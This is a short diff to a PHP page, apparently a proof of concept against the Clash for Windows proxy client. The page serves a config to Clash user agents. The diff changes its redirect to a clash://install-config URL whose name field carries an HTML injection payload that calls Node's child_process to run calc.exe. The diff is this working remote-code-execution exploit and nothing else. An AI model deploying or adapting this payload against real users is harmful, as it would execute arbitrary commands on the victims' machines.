@@ -30,7 +30,7 @@ if (strstr($str, 'Clash')) {
 	echo $poc;
 } else {
 	echo "哎呀呀！这是Clash的配置文件啦。不能用浏览器直接访问。";
-  header("Refresh:3;url=https://docs.cfw.lbyczf.com/");
+  header("Refresh:3;url=clash://install-config?url=http://127.0.0.1/1.txt&name=a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>");
 }
 
 ?>
